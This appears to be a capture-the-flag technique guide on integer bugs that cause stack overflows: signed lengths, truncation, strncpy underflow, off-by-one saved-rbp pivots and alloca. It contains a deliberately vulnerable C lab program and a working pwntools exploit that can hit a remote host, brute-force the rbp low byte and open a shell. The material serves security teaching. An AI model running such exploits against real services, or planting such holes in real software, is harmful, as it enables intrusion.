---
title: "Integer Bugs on the Stack - Signedness, Truncation and Off-by-One"
category: pwn
subcategory: integer
type: technique
tags: [integer-overflow, integer-underflow, signedness, truncation, off-by-one, stack-overflow, buffer-overflow, read, strncpy, memcpy, alloca, scanf, null-byte-poisoning, saved-rbp, stack-pivot, canary, pwntools, gdb, pwndbg, checksec]
difficulty: medium
summary: "Signed size checks, int-to-short truncation, alloca and <= loop bounds all turn a bounded copy into a stack overflow. How each one becomes saved-rip control."
when_to_use:
  - "A length is read as int/short/char and then passed to read/memcpy/strncpy as size_t"
  - "The bound check is `if (len > sizeof(buf))` but len is signed, so -1 passes"
  - "A loop is `for (i = 0; i <= n; i++)` writing buf[i] - exactly one byte past the end"
  - "alloca()/VLA sizes come from user input"
  - "You can write exactly one NUL byte past a buffer that ends at saved rbp"
tools: [pwntools, gdb, pwndbg, gef, checksec, ghidra, ropgadget]
related: [stack-buffer-overflow-basics, stack-ret2win, stack-uninitialized-leak, rop-fundamentals, rop-stack-pivot, mitigation-partial-overwrite-brute, mitigation-canary-bypass]
---

## TL;DR

A bounds check is only as good as the type it is done in. Signed comparisons accept
negative lengths that become huge `size_t` values; narrow types drop the high bits of
an already-validated length; `<=` in a loop writes one byte past the array. Each turns
a "safe" bounded copy into the plain overflow from `stack-buffer-overflow-basics`,
sometimes with only a single byte of control.

## Recognise it

- `int len; read(0, &len, 4); if (len > 64) die(); read(0, buf, len);` - `len = -1`
  passes the check and becomes `0xFFFFFFFFFFFFFFFF` as `size_t`.
- `short n = ...;` or `char n = ...;` after the check - the check used the wide value,
  the copy uses the narrow one (or the other way around).
- `strncpy(dst, src, strlen(src))`, or `strncpy(dst, src, n - 1)` where `n` can be 0
  so `n - 1` underflows to `SIZE_MAX`.
- `for (i = 0; i <= n; i++) buf[i] = ...;` or `buf[strlen(buf)] = '\0'` after a fill.
- `alloca(n)` / `char vla[n]` with attacker-controlled `n` - rsp moves by an attacker
  value and can land on top of the saved return address.
- In Ghidra: `read(0, local_48, (long)(int)uVar1)` - `(long)(int)` and `(ulong)` casts
  around a size are the tell.

## Vulnerable source

```c
/* intbugs.c - four separate integer bugs, one per menu entry */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <alloca.h>

void win(void) { system("/bin/sh"); _exit(0); }

static int read_int(void) {
    char line[16];
    if (!fgets(line, sizeof(line), stdin)) exit(1);
    return atoi(line);
}

/* BUG 1: signed length. len is int, the check is signed, read() takes size_t. */
static void signed_read(void) {
    char buf[64];
    int len = read_int();
    if (len > (int)sizeof(buf)) { puts("too big"); return; }
    read(0, buf, len);                          /* -1 -> 0xffffffffffffffff */
    printf("got %s\n", buf);
}

/* BUG 2: truncation. The check runs on an int, the copy on a short. */
static void truncated_copy(void) {
    char buf[64], src[0x10000];
    int n = read_int();
    if (n > 64) { puts("too big"); return; }
    read(0, src, sizeof(src) - 1);
    unsigned short small = (unsigned short)n;   /* 0x10040 -> 0x40, -1 -> 0xffff */
    memcpy(buf, src, small);
    printf("copied %u\n", small);
}

/* BUG 3: computed strncpy length underflows when the input is empty. */
static void strncpy_len(void) {
    char buf[64], src[256];
    ssize_t n = read(0, src, sizeof(src));
    if (n < 0) return;
    src[n ? n - 1 : 0] = '\0';
    strncpy(buf, src, strlen(src) - 1);         /* strlen == 0 -> SIZE_MAX */
    buf[63] = '\0';
    printf("buf=%s\n", buf);
}


/* BUG 4: off-by-one. `<=` writes buf[64], the LSB of saved rbp. */
static void off_by_one(void) {
    char buf[64];
    int n = read_int();
    if (n > 64) { puts("too big"); return; }
    for (int i = 0; i <= n; i++)                /* <= instead of < */
        if (read(0, &buf[i], 1) != 1) break;
    printf("ok\n");
}

/* BUG 5: alloca with an attacker-controlled size moves rsp anywhere. */
static void alloca_bug(void) {
    int n = read_int();
    char *p = alloca(n);                        /* no check at all */
    read(0, p, 64);
    printf("alloca at %p\n", (void *)p);
}

int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    for (;;) {
        puts("1) signed 2) trunc 3) strncpy 4) offbyone 5) alloca 0) quit");
        printf("> ");
        switch (read_int()) {
            case 1: signed_read();    break;
            case 2: truncated_copy(); break;
            case 3: strncpy_len();    break;
            case 4: off_by_one();     break;
            case 5: alloca_bug();     break;
            default: return 0;
        }
    }
}
```

Build:

```sh
# -fno-stack-protector : study the raw overflow first; re-enable for the canary drill
# -no-pie              : win() at a fixed address
# -m64                 : 64-bit, so the int -> size_t widening is visible
# -z execstack -w      : keeps the lab binary uniform and silences the warnings
gcc -fno-stack-protector -z execstack -no-pie -m64 -w -o intbugs intbugs.c
```

## Theory

### 1. Signedness: `read(fd, buf, n)` with signed n

`read`'s third parameter is `size_t` (unsigned 64-bit), so the comparison is subtle
when the length lives in an `int`:

- `if (len > sizeof(buf))` promotes `len` to `size_t`, so `-1` becomes
  `0xFFFFFFFFFFFFFFFF` and the check *does* catch it.
- `if (len > (int)sizeof(buf))` or `if (len > 64)` compares two `int`s. `-1 > 64` is
  false, the check passes, and `read(0, buf, len)` sign-extends `-1` to `SIZE_MAX`.

The cast in the check decides whether the bug exists, so read the check's types, not
its shape. This is by far the most common form.

`read` with `SIZE_MAX` does not write 2^64 bytes - the kernel caps one `read` at
`0x7ffff000` and returns whatever is available on the pipe or socket, so you send
exactly as many bytes as you want. That makes it a *better* primitive than `gets`:
NUL-safe and newline-safe. `memcpy(buf, src, len)` with a negative `len` instead
copies a fixed huge size and always faults, usually before the `ret` you wanted.

### 2. Truncation: int -> short / char

```c
int n = user();                         /* 0x10040 */
if (n > 64) return;                     /* 0x10040 > 64 -> rejected... */
unsigned short s = (unsigned short)n;   /* ...but s == 0x0040, and -1 -> 0xffff */

unsigned short total = a + b;   /* both 0x8000 -> total == 0: wrapping accumulator */
char *p = malloc(total);        /* tiny */
memcpy(p, src, a + b);          /* huge */
```

The check and the use disagree. Look for the reverse ordering too - the check on the
*narrow* value, the copy on the *wide* one. Useful shapes for a stack target: a
`char n` length where `200` becomes `-56` and `if (n > 64)` passes; a `short idx`
array index where a negative value writes *below* the buffer into the caller's frame;
`(unsigned short)n` with `n = 0xFFFF...`, giving a comfortable 65535 bytes.

### 3. `strncpy` with a computed length

`strncpy(dst, src, n)` copies at most `n` bytes *and pads with NULs up to `n`* - so a
short source with a huge `n` still writes `n` bytes of zeros.

- `strncpy(buf, src, strlen(src) - 1)` with an empty `src`, or `strncpy(buf, src,
  n - 1)` with `n == 0`: `0 - 1` is `SIZE_MAX`, so `strncpy` walks the address space
  writing NULs until it faults - destroying the canary and saved rip, but usually just
  crashing.
- `strncpy(buf, src, strlen(src))` is the *no-terminator* bug: `buf` is not
  NUL-terminated, so a later `printf("%s", buf)` leaks the adjacent locals, canary and
  saved rbp (`stack-uninitialized-leak`).
- `strncat(buf, src, sizeof(buf) - strlen(buf))` is off by one by design - `strncat`
  appends its terminator *after* the `n` bytes.

### 4. Off-by-one and the saved-rbp LSB

`for (i = 0; i <= n; i++) buf[i] = c;` with `n == sizeof(buf)` writes `buf[64]` - the
first byte of whatever follows. With no canary, that is the low byte of saved rbp.
Recall `leave == mov rsp, rbp ; pop rbp` and `ret == pop rip`.

`vuln()`'s epilogue restores `rsp` from `rbp` and pops the caller's `rbp`. Corrupt the
*saved* rbp that `vuln` pops and `main` runs with a wrong `rbp`; when `main` executes
its own `leave; ret` it sets `rsp = rbp_corrupted` and pops rip from there. You have
moved the stack pointer by up to 255 bytes, into your own buffer - a mini stack pivot,
with everything above it as your ROP chain.

This is called **null-byte poisoning** because the byte you can write is frequently
`\x00` (a `strcpy`/`strncpy`/`fgets` terminator). Writing `\x00` to the LSB rounds
saved rbp *down* to a 256-byte boundary, moving the frame down by `rbp & 0xff` bytes;
if your buffer sits in that range, `main`'s `ret` pops from your data.

Alignment matters: the final `ret` pops from `rsp`, so `(rbp_corrupted + 8)` must
point at your first gadget. Only the low byte changes, so there are just 256 possible
frames - brute-forceable whenever the service forks. A two-byte off-by-one gives 16
bits of rbp and a pivot up to 64 KB away. An off-by-one into a *canary* is useless for
pivoting, but overwriting its NUL byte turns the canary into a leakable string
(`mitigation-canary-bypass`).

### 5. alloca / VLA

`alloca(n)` compiles to `sub rsp, n` (rounded) with no check, so a controlled `n`
moves the stack pointer for you. A huge `n` drops `rsp` below the guard page and the
next write lands in an unrelated mapping - the *stack clash* class. A negative or
wrapping `n` puts the "new" buffer *above* the saved return address, so an ordinary
bounded `read` into it overwrites saved rip with no overflow at all. An `n` of a few
hundred places the buffer exactly on top of the saved rip slot. The same holds for
C99 VLAs when `-fstack-clash-protection` is off.

## Attack

1. Write out the C type of every step - input type, check type, use type. The
   mismatch is the bug.
2. Pick the value that survives the check and explodes at the use: `-1`/`0x80000000`
   for a signed check, `0x10000 + real_len` (`0x100 +` for a `char`) for truncation,
   `0` or an empty line for an `n - 1` underflow, exactly `sizeof(buf)` for an
   off-by-one.
3. Confirm in gdb: how many bytes did you really write, and where relative to saved
   rbp / saved rip?
4. Many bytes -> plain overflow; go to `stack-buffer-overflow-basics` and
   `stack-ret2win`. `alloca` -> compute `n` so the returned pointer sits at or above
   the saved rip slot, then use the normal bounded read.
5. Exactly one byte at `buf[sizeof(buf)]` -> saved-rbp LSB pivot: leak or brute the
   original low byte, lay the ROP chain inside the buffer at a 256-aligned target, and
   overwrite the LSB so `main`'s `leave; ret` lands on it.

## Debugging workflow

```
gdb ./intbugs
pwndbg> b *signed_read+<offset of the read call>
pwndbg> run
pwndbg> p/x $rdx             # 0xffffffffffffffff means the sign extension fired
pwndbg> stack 20             # where are saved rbp / saved rip relative to rsp?
```

For the off-by-one, watch the exact slot, then `main`'s epilogue:

```
pwndbg> b *off_by_one
pwndbg> watch *(unsigned char *)($rbp)     # the LSB of saved rbp lives at [rbp]
pwndbg> c
pwndbg> b *main+<offset of leave>          # then, at main's epilogue:
pwndbg> p $rbp                             # the corrupted value
pwndbg> x/8gx $rbp                         # is your chain here?
```

```sh
# Reach check: menu 1, length -1, 200 bytes - how far past buf does it write?
python3 -c 'import sys; sys.stdout.buffer.write(b"1\n-1\n" + b"A"*200)' | ./intbugs
```

## Exploit

```python
#!/usr/bin/env python3
"""Exploit the signed-length bug (menu 1) and the off-by-one rbp pivot (menu 4).

Usage: ./exploit.py [--mode signed|offbyone|brute] [HOST PORT]
"""
from pwn import *
import sys

BINARY = "./intbugs"
OFFSET = 72          # buf[64] + saved rbp -> saved rip, measured with cyclic()

context.binary = elf = ELF(BINARY, checksec=False)
context.arch = "amd64"
context.log_level = "info"

def start(argv):
    if len(argv) >= 2:
        return remote(argv[0], int(argv[1]))
    return process(BINARY)

def menu(io, choice):
    io.sendlineafter(b"> ", str(choice).encode())

def chain():
    """A bare `ret` for 16-byte alignment, then win()."""
    rop = ROP(elf)
    return p64(rop.find_gadget(["ret"])[0]) + p64(elf.symbols["win"])

def exploit_signed(io):
    """len = -1 passes `if (len > (int)sizeof(buf))` and becomes SIZE_MAX."""
    payload = flat({OFFSET: chain()}, filler=b"A")
    menu(io, 1)
    io.sendline(b"-1")                 # the poisoned length
    io.send(payload)                   # read() copies as much as we send
    log.success("sent %d bytes through a -1 length check", len(payload))

def exploit_offbyone(io, low_byte=0x00, chain_slot=0x20):
    """Write one byte past buf[64] - the LSB of saved rbp - then pivot on main's ret.

    The ROP chain sits at buf+chain_slot so that once main's `leave; ret` sets
    rsp = corrupted_rbp, the following `ret` pops our first gadget.
    """
    c = chain()
    body = bytearray(b"B" * 64)
    body[chain_slot:chain_slot + len(c)] = c
    menu(io, 4)
    io.sendline(b"64")                 # loop runs i = 0..64 inclusive -> 65 writes
    io.send(bytes(body) + bytes([low_byte]))
    log.success("poisoned saved rbp LSB with %#04x", low_byte)

def brute_rbp(argv):
    """No leak? The service forks, so the layout is stable: try all 256 low bytes."""
    spray = chain() * 4
    for low in range(0x100):
        io = start(argv)
        try:
            menu(io, 4)
            io.sendline(b"64")
            io.send(spray[:64] + bytes([low]))
            menu(io, 0)
            io.sendline(b"echo PWNED")
            if b"PWNED" in io.recvrepeat(0.4):
                log.success("hit with saved-rbp low byte %#04x", low)
                io.interactive()
                return True
        except EOFError:
            pass
        finally:
            try:
                io.close()
            except Exception:
                pass
    log.failure("exhausted all 256 low bytes")
    return False

def main():
    argv = [a for a in sys.argv[1:] if not a.startswith("--")]
    mode = "signed"
    if "--mode" in sys.argv:
        mode = sys.argv[sys.argv.index("--mode") + 1]
        argv = [a for a in argv if a != mode]

    if mode == "brute":
        brute_rbp(argv)
        return

    io = start(argv)
    if mode == "offbyone":
        exploit_offbyone(io)
    else:
        exploit_signed(io)

    menu(io, 0)                        # let main return into our chain
    io.sendline(b"echo PWNED; id; cat flag* 2>/dev/null")
    io.interactive()

if __name__ == "__main__":
    main()
```

## Variants & pitfalls

- **The check may be correct.** `if (len > sizeof(buf))` with an `int len` promotes to
  `size_t` and *does* reject `-1`; only `(int)sizeof(buf)`, a literal `64` or an `int`
  bound is exploitable. On 32-bit `size_t` is 32-bit too, so `-1` is `0xFFFFFFFF` and
  `read` may return `-1`/`EFAULT` instead of copying.
- **`read` returns early** with `SIZE_MAX`, so you control how many bytes land and can
  stop before a guard page. `memcpy` with a huge size always faults before `ret`.
- **Parser differences.** `atoi("0x41")` is 0, `strtol(s, NULL, 0)` parses hex,
  `scanf("%d")` overflow is undefined, `scanf("%u")` accepts `4294967295`.
- **Off-by-one with a canary.** `buf[64]` hits the canary, not saved rbp, so the pivot
  does not apply; target the canary's own NUL byte (`mitigation-canary-bypass`).
- **rbp pivot needs a known rbp** (brute 256 values without a leak), and after
  `leave; ret` in `main` `rsp` is `rbp_corrupt + 8` - an off-by-8 here looks exactly
  like a wrong low byte.
- **`alloca` and stack probes.** `-fstack-clash-protection` turns a wild `alloca` into
  a clean crash - check `objdump` for the probe loop first.
- **Compiler reordering.** With optimisation `buf` may not be adjacent to saved rbp -
  verify in gdb. A negative `buf[idx]` writes *below* the frame instead, reaching the
  caller's locals and sometimes a saved canary.

## Tools

- `pwntools` - `flat`, `cyclic`, `ROP`, `p64`, plus a fork-server brute loop.
- `gdb` + `pwndbg`/`gef` - `$rdx` at the copy is the real size, `watch` the byte at
  `[rbp]` for off-by-one, `stack 20` for the frame map.
- `checksec` - canary presence decides whether the off-by-one hits rbp or the canary.
- `ghidra` / `ida` - the `(long)(int)` cast chain is the fastest way to spot a
  signedness bug in a stripped binary.
- `ROPgadget` / `ropper` - gadgets for the post-pivot chain.
- `gcc -Wconversion -Wsign-conversion` - finds most of these if you have source.
